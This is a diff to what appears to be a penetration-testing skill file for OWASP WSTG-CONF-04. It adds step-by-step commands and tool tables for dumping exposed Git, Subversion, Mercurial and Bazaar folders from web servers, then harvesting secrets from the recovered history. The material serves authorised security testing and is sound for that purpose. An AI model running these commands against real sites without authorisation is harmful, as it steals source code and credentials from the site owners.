@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [misconfiguration, hardening, server, wstg, conf]
 tech_stack: []
 cwe_ids: [CWE-16]
-chains_with: []
+chains_with: [wstg-conf-01, wstg-conf-02]
 prerequisites: []
-severity_boost: {}
+severity_boost:
+  wstg-conf-01: "Backup File Credential Leak + Exposed Admin Interface = Full System Takeover (Critical)"
 ---
 
 # wstg-conf-04
@@ -301,6 +302,134 @@ done
 echo "[+] Scan complete"
 ```
 
+### Exposed Version Control Folders - Git/SVN/Mercurial/Bazaar Dumping (from PayloadsAllTheThings)
+
+Leftover `.git`, `.svn`, `.hg`, or `.bzr` directories in the web root let an attacker reconstruct the entire source history, even without directory listing enabled:
+
+```bash
+# Check for the tell-tale files first
+for f in .git/config .git/HEAD .git/logs/HEAD .svn/entries .svn/wc.db .hg/dirstate .hg/requires .bzr/README .bzr/branch/format; do
+    status=$(curl -s -o /dev/null -w "%{http_code}" "https://{target}/$f")
+    echo "$f: $status"
+done
+
+# Automated full dump with git-dumper (works even when only single objects are fetchable, no listing needed)
+pip install -r requirements.txt
+python3 git-dumper.py https://{target}/.git ./dumped_repo
+
+# Manual recovery from .git/logs/HEAD when git-dumper is blocked
+curl -s https://{target}/.git/logs/HEAD
+# Take a commit hash from the log, fetch the object (first 2 chars = subdir, rest = filename)
+curl -s https://{target}/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c -o obj
+mkdir -p .git/objects/26 && mv obj .git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
+git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c   # reveals tree/parent/commit message
+```
+
+Recover file names/hashes from `.git/index` (works even without the reflog) using the `gin` index parser, then repeat the object-fetch process above per file:
+
+```bash
+pip3 install gin
+gin .git/index | egrep -e "name|sha1"
+# name = config/database.yml
+# sha1 = 862a3e58d138d6809405aa062249487bee074b98
+```
+
+#### Additional Git Dumping Tools
+
+| Tool | Usage |
+| ---- | ----- |
+| **git-dumper** (arthaud/git-dumper) | `python3 git-dumper.py http://{target}/.git ~/website` |
+| **GitTools** (internetwache/GitTools) | `./gitdumper.sh http://{target}/.git/ /tmp/destdir && git checkout -- .` |
+| **GitHack** (lijiejie/GitHack) | `python2 GitHack.py http://{target}/.git/` |
+| **diggit.py** (bl4de/security-tools) | `./diggit.py -u http://{target} -t /tmp/dest -o <object_hash>` |
+| **GoGitDumper** (c-sto/gogitdumper) | `gogitdumper -u http://{target}/.git/ -o dest/.git/ && git log && git checkout` |
+| **dvcs-ripper rip-git.pl** (kost/dvcs-ripper) | `perl rip-git.pl -v -u "http://{target}/.git/"` — also rips SVN/HG |
+
+After dumping, run a secret scanner against the recovered working tree/history — commits removed from HEAD but still present in objects often contain credentials that were later "fixed":
+
+```bash
+trufflehog filesystem ./dumped_repo
+gitleaks detect --source=./dumped_repo --no-git=false
+```
+
+#### Additional Secret-Harvesting Tools
+
+| Tool | Purpose | Usage |
+| ---- | ------- | ----- |
+| **noseyparker** (praetorian-inc/noseyparker) | Regex/entropy secret scanner over any datastore/git history | `noseyparker scan --datastore np.datastore --git-url <repo_or_local_path>` then `noseyparker report --color always` |
+| **Yar** (nielsing/yar) | Scans all repos of a user/org for secrets (regex + entropy) | `yar -o orgname --both` |
+| **Gitrob** | Clones org/user repos and flags filenames matching sensitive-file signatures | `GITROB_ACCESS_TOKEN=<token> gitrob target1 target2` |
+
+A reverse-proxy rule returning `403` instead of `404` for `/.git`/`/.svn` (e.g. Nginx `location /.git { deny all; }`) still confirms the folder exists — worth noting even when direct dumping is blocked.
+
+### Bazaar (.bzr) Dumping
+
+Bazaar (bzr) repositories exposed under the web root can be reconstructed the same way as Git/SVN:
+
+```bash
+# Confirm exposure
+curl -s https://{target}/.bzr/README
+curl -s https://{target}/.bzr/branch/branch.conf
+curl -s https://{target}/.bzr/branch/last-revision
+
+# rip-bzr.pl (kost/dvcs-ripper) - dockerized
+docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u https://{target}/.bzr/
+
+# bzr_dumper (SeahunOh/bzr_dumper) - pulls pack-names, checkout/dirstate, branch metadata, then object packs
+python3 dumper.py -u "https://{target}/" -o source
+# [+] GET repository/pack-names / checkout/dirstate / branch/branch.conf / branch/last-revision ...
+
+# Restore the working tree from the dumped repo
+cd source && bzr revert
+#  N  application.py
+#  N  database.py
+#  N  static/
+```
+
+### Mercurial (.hg) Dumping
+
+```bash
+# Confirm exposure
+curl -s https://{target}/.hg/requires
+curl -s https://{target}/.hg/dirstate
+curl -s https://{target}/.hg/store/00manifest.i
+
+# rip-hg.pl (kost/dvcs-ripper) - rips SVN/GIT/HG alike, dockerized
+docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-hg.pl -v -u https://{target}/.hg/
+```
+
+After the rip completes, `hg log` / `hg update` against the recovered `.hg` store reveals commit history and working files — treat it the same as a recovered `.git` tree for secret scanning (trufflehog/gitleaks work on any VCS working directory, not just Git).
+
+### Subversion (.svn) Dumping
+
+```bash
+# Confirm exposure and grab a single file directly (older SVN <1.7 layout)
+curl -s https://{target}/.svn/text-base/wp-config.php.svn-base
+curl -s https://{target}/.svn/entries
+
+# Automated full dump - svn-extractor (anantshri/svn-extractor), works for the newer wc.db-based layout (SVN >=1.7)
+python svn-extractor.py --url "https://{target}/.svn/"
+```
+
+Manual recovery from `.svn/wc.db` (SQLite database, SVN >= 1.7 working-copy format) when the extractor is blocked or you need a specific file:
+
+```bash
+# 1. Download the SQLite working-copy database
+curl -s https://{target}/.svn/wc.db -o wc.db
+
+# 2. Query the NODES table to find file paths + content SHA1
+sqlite3 wc.db "SELECT local_relpath, checksum FROM NODES;"
+# Example row: local_relpath='trunk/test.txt', checksum='$sha1$945a60e68acc693fcb74abadb588aac1a9135f62'
+
+# 3. Rebuild the download path from the checksum:
+#    - strip the "$sha1$" prefix
+#    - append ".svn-base"
+#    - use the first 2 hex chars of the hash as the pristine/ subdirectory
+curl -s https://{target}/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base -o test.txt
+```
+
+This recovers file content even for files removed from the current working copy but still present in the local pristine cache — useful for finding old credentials/config that were later deleted.
+
 ### Nuclei Backup Templates
 
 ```bash
@@ -389,6 +518,11 @@ location ~* \.(bak|backup|old|orig|save|swp|tmp|sql|tar|gz|zip|rar)$ {
 
 - [OWASP WSTG - Review Old Backup and Unreferenced Files](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information)
 - [SecLists Backup Filenames](https://github.com/danielmiessler/SecLists)
+- [PayloadsAllTheThings - Insecure Source Code Management](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Source%20Code%20Management)
+- [PayloadsAllTheThings - Git](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Source%20Code%20Management/Git.md)
+- [PayloadsAllTheThings - Bazaar](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Source%20Code%20Management/Bazaar.md)
+- [PayloadsAllTheThings - Mercurial](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Source%20Code%20Management/Mercurial.md)
+- [PayloadsAllTheThings - Subversion](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Source%20Code%20Management/Subversion.md)
 
 
 ---
